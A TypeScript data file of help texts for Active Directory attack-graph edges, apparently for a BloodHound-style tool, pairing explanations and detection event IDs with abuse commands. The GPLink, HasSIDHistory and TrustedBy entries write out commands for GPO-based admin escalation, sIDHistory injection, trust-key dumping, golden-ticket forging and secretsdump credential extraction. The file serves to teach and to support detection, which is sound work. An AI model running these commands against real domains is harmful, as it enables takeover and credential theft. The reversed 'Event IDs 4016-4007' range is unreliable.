import type { EdgeHelpText } from './types';

export const adStructureEdges: EdgeHelpText[] = [
  {
    kind: 'Contains',
    category: 'AD Structure',
    general:
      'The Contains edge indicates that an Active Directory container object (such as a Domain, OU, or container) holds another object within its hierarchy. This is the fundamental structural relationship in AD that defines the organizational tree. Objects inherit Group Policy settings from their parent containers through this relationship, making it security-relevant because GPO linkage at a parent container cascades to all contained objects.',
    abuse:
      'The Contains relationship itself is not directly abusable, but it is critical for understanding the scope of Group Policy application and delegation of control. An attacker who compromises an OU or container with delegated administrative rights gains control over all objects contained within. This is particularly dangerous when service accounts or privileged users are placed in OUs with broad delegation.',
    opsec:
      'Monitoring structural changes in AD is important. Event ID 5136 (A directory service object was modified) and Event ID 5137 (A directory service object was created) in the Directory Service Changes audit log can detect when objects are moved between OUs. Event ID 4662 (An operation was performed on an object) with specific GUID filters can track delegation-of-control changes on container objects.',
    references: [
      {
        title: 'BloodHound Documentation - Contains',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312785653275-Contains',
      },
      {
        title: 'Microsoft - Active Directory Organizational Units',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/creating-an-organizational-unit-design',
      },
    ],
  },
  {
    kind: 'DCFor',
    category: 'AD Structure',
    general:
      'The DCFor edge indicates that a computer object is a Domain Controller for a specific domain. Domain Controllers hold a writable copy of the AD database (NTDS.dit), handle authentication requests, and replicate directory data. Compromising a Domain Controller grants access to all credentials in the domain, including the krbtgt hash needed for Golden Ticket attacks.',
    abuse:
      'If an attacker gains administrative access to a Domain Controller, the domain is fully compromised. The attacker can extract the NTDS.dit database to obtain all domain credentials, forge Kerberos tickets, and establish persistent access. The DCFor relationship helps identify which computers are Domain Controllers to prioritize for both attack and defense.',
    opsec:
      'Domain Controller compromise is a catastrophic event. Monitor Event ID 4624 (Logon) type 10 (Remote Interactive) to Domain Controllers, Event ID 4672 (Special privileges assigned to new logon) for unexpected privileged logons, and Event ID 4648 (A logon was attempted using explicit credentials) targeting DCs. Directory Services Restore Mode (DSRM) password usage should also be audited.',
    references: [
      {
        title: 'BloodHound Documentation - DCFor',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312793231003-DCFor',
      },
      {
        title: 'adsecurity.org - Securing Domain Controllers',
        url: 'https://adsecurity.org/?p=3377',
      },
    ],
  },
  {
    kind: 'GPLink',
    category: 'AD Structure',
    general:
      'The GPLink edge indicates that a Group Policy Object (GPO) is linked to an Organizational Unit, Domain, or Site. When a GPO is linked to a container, all objects within that container (and nested sub-containers, unless inheritance is blocked) are subject to the policy settings defined in the GPO. GPOs can configure security settings, deploy software, run scripts at startup/logon, and modify registry keys — making them a powerful mechanism for both administration and attack.',
    windowsAbuse: `If you have write access to a GPO that is linked to a target OU containing computers or users, you can abuse it for code execution or privilege escalation:

# Using SharpGPOAbuse to add an immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Vulnerable GPO"

# Using SharpGPOAbuse to add a user to local administrators via Restricted Groups
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# Using PowerView to enumerate GPO links
Get-DomainGPO | Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite"}`,
    linuxAbuse: `# Using pyGPOAbuse to add a scheduled task via a writable GPO
python3 pygpoabuse.py domain.local/attacker:'Password' -gpo-id "6AC1786C-016F-11D2-945F-00C04fB984F9" -command 'net localgroup administrators attacker /add' -taskname 'Update' -f

# Using bloodyAD to enumerate GPO links
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get object 'OU=Servers,DC=domain,DC=local' --attr gPLink`,
    opsec:
      'GPO modifications generate Event ID 5136 (A directory service object was modified) when the GPO object in AD is changed, and Event ID 4670 (Permissions on an object were changed) if ACLs are modified. Changes to the SYSVOL share where GPO files are stored can be tracked via file auditing. Group Policy processing on clients generates Event IDs 4016-4007 in the GroupPolicy operational log. SOC teams commonly monitor for GPO changes as they affect many machines simultaneously.',
    references: [
      {
        title: 'BloodHound Documentation - GPLink',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312795186715-GPLink',
      },
      {
        title: 'SpecterOps - Abusing GPO Permissions',
        url: 'https://posts.specterops.io/abusing-gpo-permissions-5e58a218e1db',
      },
      {
        title: 'The Hacker Recipes - GPO Abuse',
        url: 'https://www.thehacker.recipes/ad/movement/group-policies',
      },
    ],
  },
  {
    kind: 'MemberOf',
    category: 'AD Structure',
    general:
      'The MemberOf edge indicates that a principal (user, group, or computer) is a member of an Active Directory security group. Group membership is the primary mechanism for access control in AD — permissions on resources are assigned to groups, and users inherit those permissions through membership. Nested group membership (group A is a member of group B) creates transitive access paths that BloodHound is specifically designed to enumerate.',
    abuse:
      'The MemberOf relationship itself is informational, but it reveals inherited permissions. An attacker who can add themselves or a controlled principal to a privileged group (e.g., Domain Admins, Backup Operators, Server Operators) gains all permissions assigned to that group. BloodHound uses MemberOf edges to unroll nested group memberships and identify effective access.',
    opsec:
      'Group membership changes are logged under Event ID 4728 (A member was added to a security-enabled global group), Event ID 4732 (A member was added to a security-enabled local group), and Event ID 4756 (A member was added to a security-enabled universal group). The corresponding removal events are 4729, 4733, and 4757. Changes to privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Administrators) should trigger high-priority alerts.',
    references: [
      {
        title: 'BloodHound Documentation - MemberOf',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312838474267-MemberOf',
      },
      {
        title: 'adsecurity.org - Privileged AD Group Membership',
        url: 'https://adsecurity.org/?p=3700',
      },
    ],
  },
  {
    kind: 'HasSIDHistory',
    category: 'AD Structure',
    general:
      'The HasSIDHistory edge indicates that a principal has another SID in its sIDHistory attribute. The sIDHistory attribute was designed to preserve access during domain migrations — when a user is migrated from one domain to another, their old SID is added to sIDHistory so they retain access to resources in the source domain. However, this mechanism can be abused: if an attacker can write to sIDHistory, they can inject the SID of a privileged group (like Domain Admins) and gain those privileges without being a member of the group.',
    windowsAbuse: `# Using Mimikatz to inject a SID into sIDHistory (requires Domain Admin or equivalent)
# This injects the Domain Admins SID into the target user's sIDHistory
mimikatz # sid::patch
mimikatz # sid::add /sam:targetuser /new:S-1-5-21-<domain>-512

# Using PowerView to enumerate SID History
Get-DomainUser -LDAPFilter '(sidHistory=*)' -Properties samaccountname,sidhistory

# Using DSInternals to set SID History offline
Stop-Service ntds -Force
Add-ADDBSidHistory -SamAccountName targetuser -SidHistory S-1-5-21-<domain>-512 -DBPath 'C:\\Windows\\NTDS\\ntds.dit'`,
    linuxAbuse: `# Using impacket to enumerate users with SID History
# lookupsid.py can resolve SIDs but sIDHistory requires LDAP queries
python3 -c "
import ldap3
server = ldap3.Server('dc.domain.local')
conn = ldap3.Connection(server, 'domain\\\\attacker', 'Password')
conn.bind()
conn.search('DC=domain,DC=local', '(sidHistory=*)', attributes=['sAMAccountName','sIDHistory'])
for entry in conn.entries:
    print(entry)
"

# Using bloodyAD to read SID History
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get object 'targetuser' --attr sIDHistory`,
    opsec:
      'SID History injection is a high-severity attack. Event ID 4765 (SID History was added to an account) is generated when sIDHistory is modified — this event should always trigger an alert as legitimate sIDHistory modifications only occur during domain migrations. Event ID 4766 (An attempt to add SID History to an account failed) logs failed attempts. Additionally, monitor for Event ID 4648 (Explicit credential logon) from accounts with unexpected SID History values.',
    references: [
      {
        title: 'BloodHound Documentation - HasSIDHistory',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312797084059-HasSIDHistory',
      },
      {
        title: 'adsecurity.org - SID History Persistence',
        url: 'https://adsecurity.org/?p=1772',
      },
      {
        title: 'The Hacker Recipes - SID History',
        url: 'https://www.thehacker.recipes/ad/persistence/sid-history',
      },
    ],
  },
  {
    kind: 'TrustedBy',
    category: 'AD Structure',
    general:
      'The TrustedBy edge indicates that one domain trusts another domain, allowing principals from the trusted domain to authenticate to resources in the trusting domain. AD trust relationships can be one-way or two-way, and can be transitive (as in forest trusts) or non-transitive. Trust relationships expand the attack surface because compromising one domain in a trust chain may enable lateral movement to other trusted domains, especially when SID filtering is not enforced.',
    windowsAbuse: `# Enumerate trust relationships using PowerView
Get-DomainTrust
Get-DomainTrust -Domain target.local

# Enumerate trust relationships using nltest
nltest /domain_trusts /all_trusts /v

# If you have DA in the trusting domain, forge an inter-realm TGT using Mimikatz
# First get the trust key
mimikatz # lsadump::trust /patch

# Then forge the inter-realm ticket
mimikatz # kerberos::golden /domain:child.domain.local /sid:S-1-5-21-<child-sid> /sids:S-1-5-21-<parent-sid>-519 /rc4:<trust-key> /user:Administrator /service:krbtgt /target:domain.local /ticket:trust.kirbi

# Use Rubeus to use the forged ticket
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc.domain.local /dc:dc.domain.local /ptt`,
    linuxAbuse: `# Using impacket to enumerate trusts
getTGT.py domain.local/attacker:'Password' -dc-ip 10.0.0.1
# Then use the TGT to request service tickets in the trusted domain

# Using raiseChild.py for parent-child trust escalation
raiseChild.py domain.local/administrator:'Password' -target-exec dc.parent.local

# Using secretsdump.py to dump trust keys (requires DA)
secretsdump.py domain.local/administrator:'Password'@dc.domain.local -just-dc-user 'PARENT$'

# Using bloodyAD to enumerate trusts
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get trusts`,
    opsec:
      'Cross-domain authentication generates Event ID 4768 (TGT requested) with a cross-domain referral, and Event ID 4769 (TGS requested) for inter-realm service tickets. Monitor for Event ID 4624 (Logon) from foreign domain SIDs. Trust modifications generate Event ID 4706 (A new trust was created) and Event ID 4707 (A trust was removed). SID filtering violations appear as failed authentications with status 0xC000015B. Golden ticket attacks across trusts can be detected by looking for TGTs with anomalous SID History values in the PAC.',
    references: [
      {
        title: 'BloodHound Documentation - TrustedBy',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312850827419-TrustedBy',
      },
      {
        title: 'SpecterOps - Not A Security Boundary: Breaking Forest Trusts',
        url: 'https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d',
      },
      {
        title: 'The Hacker Recipes - Trusts',
        url: 'https://www.thehacker.recipes/ad/movement/trusts',
      },
      {
        title: 'adsecurity.org - AD Trust Information',
        url: 'https://adsecurity.org/?p=1588',
      },
    ],
  },
];
